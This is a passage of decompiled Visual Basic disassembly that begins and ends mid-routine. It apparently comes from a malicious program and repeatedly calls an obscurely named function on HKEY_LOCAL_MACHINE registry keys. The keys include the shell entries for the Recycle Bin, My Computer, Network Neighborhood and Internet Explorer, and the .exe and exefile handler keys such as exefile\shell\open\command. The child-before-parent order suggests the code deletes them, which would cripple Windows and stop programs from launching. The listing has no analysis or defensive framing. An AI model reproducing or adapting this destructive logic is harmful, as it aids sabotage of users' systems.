  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004ABh
  push 00435DE8h ; "SOFTWARE\Classes\CLSID\{4516EC41-8F20-11d0-9B6D-0000C0781BC3}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004ACh
  push 00435EB8h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\ShellFolder"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004ADh
  push 00435F50h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\PropertySheetHandlers\{596AB062-B4D2-4215-9F74-E9109B0A8153}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004AEh
  push 004360ACh ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\PropertySheetHandlers\{4a7ded0a-ad25-11d0-98a8-0800361b1103}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004AFh
  push 004361B8h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\PropertySheetHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B0h
  push 0043629Ch ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\ContextMenuHandlers\Offline Files"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B1h
  push 00436370h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\ContextMenuHandlers"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B2h
  push 0043648Ch ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B3h
  push 0043651Ch ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find\ddeexec\topic"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B4h
  push 00436678h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find\ddeexec\application"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B5h
  push 00436738h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find\ddeexec"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B6h
  push 004365D0h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find\command"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B7h
  push 00436860h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B8h
  push 004368F8h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004B9h
  push 00436984h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\InProcServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004BAh
  push 00436A4Ch ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004BBh
  push 00436AE4h ; "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004BCh
  push 00436B64h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\VersionIndependentProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004BDh
  push 00436C34h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\Version"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004BEh
  push 00436CC4h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\TypeLib"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004BFh
  push 00436D54h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\ToolboxBitmap32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C0h
  push 00436E18h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\Programmable"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C1h
  push 00436EB4h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C2h
  push 00436F44h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\MiscStatus\1"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C3h
  push 00437004h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\MiscStatus"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C4h
  push 0043709Ch ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C5h
  push 0043713Ch ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\Control"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C6h
  push 004367E0h ; "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C7h
  push 004371E8h ; "SOFTWARE\Classes\CLSID\{44EC053A-400F-11D0-9DCD-00A0C90391D3}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C8h
  push 00437278h ; "SOFTWARE\Classes\CLSID\{44EC053A-400F-11D0-9DCD-00A0C90391D3}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004C9h
  push 00437318h ; "SOFTWARE\Classes\CLSID\{44EC053A-400F-11D0-9DCD-00A0C90391D3}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004CAh
  push 004373D0h ; "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}\VersionIndependentProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004CBh
  push 00437484h ; "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004CCh
  push 00437514h ; "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004CDh
  push 004375C0h ; "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}\DocObject"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004CEh
  push 00437654h ; "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004CFh
  push 004376D4h ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\ShellFolder"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D0h
  push 004377B0h ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex\PropertySheetHandlers\{645FF040-5081-101B-9F08-00AA002F954E}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D1h
  push 004378BCh ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex\PropertySheetHandlers"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D2h
  push 0043799Ch ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex\ContextMenuHandlers\{645FF040-5081-101B-9F08-00AA002F954E}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D3h
  push 00437AA4h ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex\ContextMenuHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D4h
  push 00437B88h ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D5h
  push 00437C18h ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\InProcServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D6h
  push 00437CB8h ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\DefaultIcon"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D7h
  push 00437D74h ; "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D8h
  push 00437DF4h ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\ShellFolder"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004D9h
  push 00437E8Ch ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find\ddeexec\topic"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004DAh
  push 00437F5Ch ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find\ddeexec\application"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004DBh
  push 0043801Ch ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find\ddeexec"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004DCh
  push 00438150h ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find\command"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004DDh
  push 004381F8h ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004DEh
  push 00438290h ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004DFh
  push 0043833Ch ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\InProcServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E0h
  push 004383DCh ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E1h
  push 00438474h ; "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E2h
  push 0043852Ch ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\ShellFolder"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E3h
  push 004385C4h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Manage\command"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E4h
  push 00438670h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Manage"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E5h
  push 0043871Ch ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find\ddeexec\topic"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E6h
  push 004387D0h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find\ddeexec\application"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E7h
  push 00438910h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find\ddeexec"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E8h
  push 004389B8h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find\command"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004E9h
  push 00438A60h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004EAh
  push 004380C4h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004EBh
  push 00438AF8h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InProcServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004ECh
  push 00438B98h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004EDh
  push 00438C30h ; "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004EEh
  push 00438CE0h ; "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\ShellFolder"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004EFh
  push 00438D78h ; "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F0h
  push 00438EC8h ; "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F1h
  push 00438F70h ; "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F2h
  push 00438FFCh ; "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\InProcServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F3h
  push 00438E30h ; "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\DefaultIcon"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F4h
  push 00438890h ; "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F5h
  push 00436428h ; "SOFTWARE\Classes\.exe\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F6h
  push 00438CB0h ; "SOFTWARE\Classes\.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F7h
  push 004390B8h ; "SOFTWARE\Classes\exefile\shellex\PropertySheetHandlers\ShimLayer Property Page"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F8h
  push 0043915Ch ; "SOFTWARE\Classes\exefile\shellex\PropertySheetHandlers\PifProps"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004F9h
  push 004391E0h ; "SOFTWARE\Classes\exefile\shellex\PropertySheetHandlers\{B41DB860-8EE4-11D2-9906-E49FADC173CA}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004FAh
  push 004392A0h ; "SOFTWARE\Classes\exefile\shellex\PropertySheetHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004FBh
  push 00439314h ; "SOFTWARE\Classes\exefile\shellex\DropHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004FCh
  push 00439374h ; "SOFTWARE\Classes\exefile\shellex"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004FDh
  push 004393BCh ; "SOFTWARE\Classes\exefile\shell\runas\command"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004FEh
  push 0043941Ch ; "SOFTWARE\Classes\exefile\shell\runas"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000004FFh
  push 0042BB14h ; "SOFTWARE\Classes\exefile\shell\open\command"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000500h
  push 0043605Ch ; "SOFTWARE\Classes\exefile\shell\open"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000501h
  push 0043776Ch ; "SOFTWARE\Classes\exefile\shell"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000502h
  push 00435E68h ; "SOFTWARE\Classes\exefile\DefaultIcon"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000503h
  push 004384F4h ; "SOFTWARE\Classes\exefile"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_10, 00000000h
  push 00459EC8h
  jmp 00459EC7h
  lea ecx, var_24
  call [004011CCh]
  lea eax, var_54
  push eax
  lea ecx, var_44
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401024h]
  add esp, 00000010h
  ret
  ret
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Public Sub FindFiles(strRootFolder, strFolder, strFile) '43B1F0
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
